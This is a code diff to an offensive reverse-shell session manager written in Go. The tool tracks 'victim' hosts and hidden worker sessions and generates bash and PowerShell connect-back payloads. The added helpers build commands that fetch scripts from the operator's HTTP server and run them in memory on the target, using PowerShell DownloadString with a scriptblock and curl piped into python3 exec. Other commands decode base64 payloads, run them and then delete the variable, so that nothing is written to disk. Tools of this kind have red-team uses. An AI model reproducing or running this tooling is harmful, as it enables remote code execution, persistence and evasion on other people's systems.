@@ -24,46 +24,71 @@ import (
 
 // Manager gerencia múltiplas sessões de reverse shell
 type Manager struct {
-	sessions        map[string]*SessionInfo // Mapa de sessões ativas
-	mu              sync.RWMutex            // Proteção concorrente
-	nextID          int                     // Próximo ID numérico
-	activeConn      net.Conn                // Conexão atualmente ativa (se houver)
-	selectedSession *SessionInfo            // Sessão selecionada (mas não necessariamente ativa)
-	menuActive      bool                    // Se estamos no menu principal
-	silent          bool                    // Suppress console output (TUI mode)
-	hasCreatedLogs  bool                    // Whether this instance created any session logs
-	notifyTUI       func(string)            // Callback to send messages to TUI output pane
-	notifyBar       func(string, int)       // Callback for notification bar overlay (msg, level)
-	spinnerStart       func(int, string)       // Start spinner in TUI (id, text)
-	spinnerStop        func(int)               // Stop spinner in TUI (id)
-	spinnerUpdate      func(int, string)       // Update spinner text in TUI (id, text)
-	nextSpinnerID      int                     // Auto-incrementing spinner ID
+	sessions             map[string]*SessionInfo         // Mapa de sessões ativas
+	mu                   sync.RWMutex                    // Proteção concorrente
+	nextID               int                             // Próximo ID numérico
+	activeConn           net.Conn                        // Conexão atualmente ativa (se houver)
+	selectedSession      *SessionInfo                    // Sessão selecionada (mas não necessariamente ativa)
+	menuActive           bool                            // Se estamos no menu principal
+	silent               bool                            // Suppress console output (TUI mode)
+	hasCreatedLogs       bool                            // Whether this instance created any session logs
+	notifyTUI            func(string)                    // Callback to send messages to TUI output pane
+	notifyBar            func(string, int)               // Callback for notification bar overlay (msg, level)
+	spinnerStart         func(int, string)               // Start spinner in TUI (id, text)
+	spinnerStop          func(int)                       // Stop spinner in TUI (id)
+	spinnerUpdate        func(int, string)               // Update spinner text in TUI (id, text)
+	nextSpinnerID        int                             // Auto-incrementing spinner ID
 	transferProgressFunc func(string, int, string, bool) // Callback for transfer progress (filename, pct, right, upload)
 	transferDoneFunc     func(string, bool, error)       // Callback for transfer completion (filename, upload, error)
-	shellOutputFunc    func(string, int, []byte) // Callback for shell relay output (sessionID, numID, data)
-	sessionDisconnFunc func(int, string)       // Callback for session disconnect (numID, remoteIP)
-	relaySuppressNano     atomic.Int64            // UnixNano of last stty resize (atomic for goroutine safety)
-	pendingWorker         atomic.Bool             // Next AddSession will be a hidden worker
-	listenerIP      string                  // IP do listener para geração de payloads
-	listenerPort    int                     // Porta do listener para geração de payloads
+	shellOutputFunc      func(string, int, []byte)       // Callback for shell relay output (sessionID, numID, data)
+	sessionDisconnFunc   func(int, string)               // Callback for session disconnect (numID, remoteIP)
+	relaySuppressNano    atomic.Int64                    // UnixNano of last stty resize (atomic for goroutine safety)
+	pendingWorker        atomic.Bool                     // Next AddSession will be a hidden worker
+	listenerIP           string                          // IP do listener para geração de payloads
+	listenerPort         int                             // Porta do listener para geração de payloads
 }
 
 // SessionInfo contém informações sobre uma sessão
 type SessionInfo struct {
-	ID        string    // ID único da sessão (hex)
-	NumID     int       // ID numérico para facilitar uso
-	Conn      net.Conn  // Conexão TCP
-	RemoteIP  string    // IP da vítima
-	Whoami    string    // user@host da vítima
-	Platform  string    // Plataforma (linux/windows/unknown)
-	Handler   *Handler  // Shell handler
+	ID          string             // ID único da sessão (hex)
+	NumID       int                // ID numérico para facilitar uso
+	Conn        net.Conn           // Conexão TCP
+	RemoteIP    string             // IP da vítima
+	Whoami      string             // user@host da vítima
+	Platform    string             // Plataforma (linux/windows/unknown)
+	Handler     *Handler           // Shell handler
 	Active      bool               // Se está sendo usada atualmente
 	CreatedAt   time.Time          // Timestamp de criação
 	LogFile     *os.File           // Session I/O log file (lazy init)
-	relayCancel  context.CancelFunc // Cancel function for TUI relay goroutine
-	moduleCancel context.CancelFunc // Cancel function for module streaming goroutine
+	relayCancel context.CancelFunc // Cancel function for TUI relay goroutine
 	relayActive bool               // Whether relay goroutine is running
 	isWorker    bool               // Hidden worker session (module execution)
+}
+
+func (m *Manager) nextVisibleSessionID(isWorker bool) int {
+	if isWorker {
+		return 0
+	}
+	id := m.nextID
+	m.nextID++
+	return id
+}
+
+func findNewestWorkerSession(sessions map[string]*SessionInfo) *SessionInfo {
+	var newest *SessionInfo
+	for _, s := range sessions {
+		if !s.isWorker {
+			continue
+		}
+		if newest == nil || s.CreatedAt.After(newest.CreatedAt) {
+			newest = s
+		}
+	}
+	return newest
+}
+
+func shouldUseWorkerForSpawn(platform string) bool {
+	return platform == "windows"
 }
 
 // Directory retorna o diretório base da sessão
@@ -309,6 +334,27 @@ func (s *SessionInfo) RunBinary(ctx context.Context, binarySource string, args [
 	return err
 }
 
+func powershellArgLiteral(args []string) string {
+	if len(args) == 0 {
+		return ""
+	}
+	quoted := make([]string, len(args))
+	for i, arg := range args {
+		quoted[i] = fmt.Sprintf("'%s'", strings.ReplaceAll(arg, "'", "''"))
+	}
+	return " " + strings.Join(quoted, " ")
+}
+
+func buildWindowsPowerShellHTTPCommand(httpURL string, args []string) string {
+	argsStr := powershellArgLiteral(args)
+	return fmt.Sprintf("$script = (New-Object Net.WebClient).DownloadString('%s'); $sb = [scriptblock]::Create($script); & $sb%s", httpURL, argsStr)
+}
+
+func buildWindowsPowerShellB64Command(varName string, args []string) string {
+	argsStr := powershellArgLiteral(args)
+	return fmt.Sprintf("$decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($%s)); $sb = [scriptblock]::Create($decoded); & $sb%s; Remove-Variable -Name %s -ErrorAction SilentlyContinue", varName, argsStr, varName)
+}
+
 // RunPowerShellInMemory executes PowerShell scripts in-memory (Windows, zero disk writes)
 // Similar to RunScriptInMemory but for PowerShell on Windows
 func (s *SessionInfo) RunPowerShellInMemory(ctx context.Context, scriptSource string, args []string) error {
@@ -343,12 +389,6 @@ func (s *SessionInfo) RunPowerShellInMemory(ctx context.Context, scriptSource st
 		return fmt.Errorf("failed to create output file: %w", err)
 	}
 
-	// Build args (PowerShell style)
-	argsStr := ""
-	if len(args) > 0 {
-		argsStr = " " + strings.Join(args, " ")
-	}
-
 	// Try HTTP method first when binbag is enabled (IEX DownloadString - blazing fast!)
 	if GlobalRuntimeConfig != nil && GlobalRuntimeConfig.BinbagEnabled {
 		filename := filepath.Base(localPath)
@@ -361,19 +401,8 @@ func (s *SessionInfo) RunPowerShellInMemory(ctx context.Context, scriptSource st
 		}
 		time.Sleep(300 * time.Millisecond)
 
-		fmt.Println(ui.Info(fmt.Sprintf("Executing PowerShell script (HTTP in-memory) and saving output to: %s", outputPath)))
-
-		go func() {
-			time.Sleep(200 * time.Millisecond)
-
-			// IEX (Invoke-Expression) with DownloadString - single HTTP request
-			cmd := fmt.Sprintf("IEX (New-Object Net.WebClient).DownloadString('%s')%s\r\n", httpURL, argsStr)
-			if err := s.Handler.ExecuteWithStreaming(cmd, outputPath); err != nil {
-				fmt.Println(ui.Error(fmt.Sprintf("Execution error: %v", err)))
-			}
-		}()
-
-		return nil
+		remoteCmd := buildWindowsPowerShellHTTPCommand(httpURL, args)
+		return s.Handler.ExecuteWithStreamingCtx(ctx, remoteCmd, outputPath)
 	}
 
 	// Fallback: b64 variable upload (works without binbag)
@@ -391,24 +420,8 @@ func (s *SessionInfo) RunPowerShellInMemory(ctx context.Context, scriptSource st
 	}
 
 	time.Sleep(300 * time.Millisecond)
-
-	fmt.Println(ui.Info(fmt.Sprintf("Executing PowerShell script (in-memory) and saving output to: %s", outputPath)))
-
-	go func() {
-		time.Sleep(500 * time.Millisecond)
-
-		debugCmd := fmt.Sprintf("if ($%s) { Write-Host 'Variable loaded: yes' } else { Write-Host 'Variable loaded: no' }\r\n", varName)
-		s.Handler.SendCommand(debugCmd)
-		time.Sleep(200 * time.Millisecond)
-
-		cmd := fmt.Sprintf("$decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($%s)); Invoke-Expression \"$decoded%s\"; Remove-Variable -Name %s\r\n", varName, argsStr, varName)
-		if err := s.Handler.ExecuteWithStreaming(cmd, outputPath); err != nil {
-			fmt.Println(ui.Error(fmt.Sprintf("Execution error: %v", err)))
-			return
-		}
-	}()
-
-	return nil
+	remoteCmd := buildWindowsPowerShellB64Command(varName, args)
+	return s.Handler.ExecuteWithStreamingCtx(ctx, remoteCmd, outputPath)
 }
 
 // RunDotNetInMemory executes .NET assemblies in-memory (Windows, zero disk writes)
@@ -579,9 +592,42 @@ Remove-Variable -Name %s -ErrorAction SilentlyContinue
 	return nil
 }
 
+func pythonArgvLiteral(args []string) string {
+	parts := []string{"'script'"}
+	for _, arg := range args {
+		escaped := strings.ReplaceAll(arg, "\\", "\\\\")
+		escaped = strings.ReplaceAll(escaped, "'", "\\'")
+		parts = append(parts, fmt.Sprintf("'%s'", escaped))
+	}
+	return "[" + strings.Join(parts, ", ") + "]"
+}
+
+func buildUnixPythonHTTPCommand(httpURL string, args []string) string {
+	argv := pythonArgvLiteral(args)
+	return fmt.Sprintf(
+		"curl -fsSL '%s' | python3 -c \"import sys; sys.argv = %s; exec(sys.stdin.read())\"",
+		httpURL,
+		argv,
+	)
+}
+
+func buildUnixPythonB64Command(varName string, args []string) string {
+	argv := pythonArgvLiteral(args)
+	return fmt.Sprintf(
+		"echo \"$%s\" | base64 -d | python3 -c \"import sys; sys.argv = %s; exec(sys.stdin.read())\"; unset %s",
+		varName,
+		argv,
+		varName,
+	)
+}
+
 // RunPythonInMemory executes Python scripts in-memory (Linux/Windows, zero disk writes)
 // Similar to RunScriptInMemory but for Python
 func (s *SessionInfo) RunPythonInMemory(ctx context.Context, scriptSource string, args []string) error {
+	if s.Platform == "windows" {
+		return fmt.Errorf("run py on Windows is not refactored yet")
+	}
+
 	// Resolve source
 	t := NewTransferer(s.Conn, s.ID)
 	t.SetPlatform(s.Platform)
@@ -613,20 +659,19 @@ func (s *SessionInfo) RunPythonInMemory(ctx context.Context, scriptSource string
 		return fmt.Errorf("failed to create output file: %w", err)
 	}
 
-	// Build args (Python sys.argv style)
-	argsStr := ""
-	if len(args) > 0 {
-		argsStr = " " + strings.Join(args, " ")
+	var remoteCmd string
+	if GlobalRuntimeConfig != nil && GlobalRuntimeConfig.BinbagEnabled {
+		filename := filepath.Base(localPath)
+		httpURL := GlobalRuntimeConfig.GetHTTPURL(filename)
+		remoteCmd = buildUnixPythonHTTPCommand(httpURL, args)
+	} else {
+		varName := fmt.Sprintf("_gummy_py_%d", time.Now().UnixNano())
+		if err := t.UploadToBashVariable(ctx, localPath, varName); err != nil {
+			return fmt.Errorf("upload to memory failed: %w", err)
+		}
+		remoteCmd = buildUnixPythonB64Command(varName, args)
 	}
 
-	// Fallback: b64 variable upload (works without binbag)
-	varName := fmt.Sprintf("_gummy_py_%d", time.Now().UnixNano())
-
-	if err := t.UploadToPythonVariable(ctx, localPath, varName); err != nil {
-		return fmt.Errorf("upload to memory failed: %w", err)
-	}
-
-	// Open terminal after upload completes
 	tailCmd := fmt.Sprintf("tail -f %s", outputPath)
 
 	if err := OpenTerminal(tailCmd); err != nil {
@@ -635,19 +680,7 @@ func (s *SessionInfo) RunPythonInMemory(ctx context.Context, scriptSource string
 
 	time.Sleep(300 * time.Millisecond)
 
-	fmt.Println(ui.Info(fmt.Sprintf("Executing Python script (in-memory) and saving output to: %s", outputPath)))
-
-	go func() {
-		time.Sleep(200 * time.Millisecond)
-
-		cmd := fmt.Sprintf("python3 -c \"import base64; exec(base64.b64decode(%s).decode('utf-8'))\" %s; unset %s\n", varName, argsStr, varName)
-		if err := s.Handler.ExecuteWithStreaming(cmd, outputPath); err != nil {
-			fmt.Println(ui.Error(fmt.Sprintf("Execution error: %v", err)))
-			return
-		}
-	}()
-
-	return nil
+	return s.Handler.ExecuteWithStreamingCtx(ctx, remoteCmd, outputPath)
 }
 
 // GummyCompleter implements readline.AutoCompleter for smart path completion
@@ -1025,12 +1058,7 @@ func (m *Manager) StartShellRelay(cols, rows int) error {
 		return nil
 	}
 
-	// Cancel any running module streaming (tail -f) before starting relay
-	if session.moduleCancel != nil {
-		session.moduleCancel()
-		time.Sleep(600 * time.Millisecond) // Wait for goroutine to exit
-	}
-	// Send Ctrl+C to kill remote tail -f and drain output
+	// Send Ctrl+C to kill any leftover foreground process and drain output
 	session.Conn.Write([]byte("\x03"))
 	time.Sleep(200 * time.Millisecond)
 	drainBuf := make([]byte, 4096)
@@ -1309,9 +1337,10 @@ func (m *Manager) AddSession(id string, conn net.Conn, remoteIP string) {
 
 	// Lock only for map mutation
 	m.mu.Lock()
+	isWorker := m.pendingWorker.CompareAndSwap(true, false)
 	session := &SessionInfo{
 		ID:        id,
-		NumID:     m.nextID,
+		NumID:     m.nextVisibleSessionID(isWorker),
 		Conn:      conn,
 		RemoteIP:  remoteIP,
 		Whoami:    "detecting...",
@@ -1321,11 +1350,10 @@ func (m *Manager) AddSession(id string, conn net.Conn, remoteIP string) {
 		CreatedAt: time.Now(),
 	}
 	// Check if this is a worker session (spawned for module execution)
-	if m.pendingWorker.CompareAndSwap(true, false) {
+	if isWorker {
 		session.isWorker = true
 	}
 	m.sessions[id] = session
-	m.nextID++
 	m.mu.Unlock()
 
 	if session.isWorker {
@@ -1681,7 +1709,7 @@ func (m *Manager) StartModule(moduleName string, args []string) {
 		case "linux", "macos":
 			payload = gen.GenerateBash() + "\n"
 		case "windows":
-			payload = gen.GeneratePowerShell() + "\n"
+			payload = gen.GeneratePowerShellDetached() + "\n"
 		default:
 			m.stopSpinner(spinID)
 			m.notify(ui.Error(fmt.Sprintf("Module failed: unsupported platform %s", platform)) + "\n")
@@ -1702,17 +1730,14 @@ func (m *Manager) StartModule(moduleName string, args []string) {
 		for i := 0; i < 50; i++ {
 			time.Sleep(200 * time.Millisecond)
 			if m.getAllSessionCount() > initialCount {
-				// Find the newest session
+				// Find the newest worker session explicitly. Workers no longer consume
+				// visible NumIDs, so NumID ordering cannot identify them reliably.
 				m.mu.RLock()
-				var newest *SessionInfo
-				for _, s := range m.sessions {
-					if newest == nil || s.NumID > newest.NumID {
-						newest = s
-					}
-				}
-				workerSession = newest
+				workerSession = findNewestWorkerSession(m.sessions)
 				m.mu.RUnlock()
-				break
+				if workerSession != nil {
+					break
+				}
 			}
 		}
 
@@ -2813,7 +2838,7 @@ func (m *Manager) StartSpawn() {
 	case "linux", "macos":
 		payload = gen.GenerateBash() + "\n"
 	case "windows":
-		payload = gen.GeneratePowerShell() + "\n"
+		payload = gen.GeneratePowerShellDetached() + "\n"
 	default:
 		if m.transferDoneFunc != nil {
 			m.transferDoneFunc("spawn", false, fmt.Errorf("Unsupported platform: %s", platform))
@@ -3146,10 +3171,10 @@ func (m *Manager) GetSessionsForDisplay() string {
 	})
 
 	// Colors: brackets=subtle(240), selected num=cyan, unselected num=base(253), arrow=magenta, name=base
-	dim := "\033[38;5;240m"   // subtle gray for [ ]
-	base := "\033[38;5;253m"  // bright white for name and unselected num
-	cyan := "\033[36m"        // cyan for selected num
-	magenta := "\033[35m"     // magenta for arrow
+	dim := "\033[38;5;240m"  // subtle gray for [ ]
+	base := "\033[38;5;253m" // bright white for name and unselected num
+	cyan := "\033[36m"       // cyan for selected num
+	magenta := "\033[35m"    // magenta for arrow
 	reset := "\033[0m"
 
 	var lines []string
@@ -3160,17 +3185,17 @@ func (m *Manager) GetSessionsForDisplay() string {
 		}
 		if s == m.selectedSession {
 			lines = append(lines, fmt.Sprintf("%s▶%s%s[%s%s%d%s%s]%s %s%s%s",
-				magenta, reset,         // ▶
-				dim, reset,             // [
-				cyan, s.NumID, reset,   // num in cyan
-				dim, reset,             // ]
-				base, name, reset))     // name
+				magenta, reset, // ▶
+				dim, reset, // [
+				cyan, s.NumID, reset, // num in cyan
+				dim, reset, // ]
+				base, name, reset)) // name
 		} else {
 			lines = append(lines, fmt.Sprintf(" %s[%s%s%d%s%s]%s %s%s%s",
-				dim, reset,             // [
-				base, s.NumID, reset,   // num in base
-				dim, reset,             // ]
-				base, name, reset))     // name
+				dim, reset, // [
+				base, s.NumID, reset, // num in base
+				dim, reset, // ]
+				base, name, reset)) // name
 		}
 	}
 	return strings.Join(lines, "\n")
